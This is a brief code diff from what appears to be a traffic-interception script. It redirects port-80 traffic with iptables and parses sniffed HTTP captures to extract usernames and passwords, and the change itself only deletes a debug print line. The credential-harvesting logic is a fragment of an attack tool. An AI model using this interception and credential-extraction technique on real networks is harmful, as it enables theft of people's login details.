@@ -2123,7 +2123,6 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
         while http_control != 1:
             capture = str(sniff_output.readline())
             if 'HTTP' in capture:
-                print "Yes"
                 credential_process = capture.split()
                 username = credential_process[5]
                 password = credential_process[7]
